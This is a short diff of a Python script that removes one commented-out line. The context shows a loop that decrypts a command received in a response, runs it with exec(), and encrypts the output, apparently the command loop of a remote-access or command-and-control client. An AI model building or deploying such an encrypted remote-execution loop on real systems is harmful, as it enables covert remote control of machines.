@@ -114,7 +114,6 @@ if __name__ == '__main__':
             encrypted_cmd = parse_json(response) 
             cipher_text = encrypt("Testing testing 123~")
             cmd = decrypt(encrypted_cmd) 
-            # cmd = encrypted_cmd
             output = exec(cmd) 
             if output != "": 
                 msg = encrypt(output)
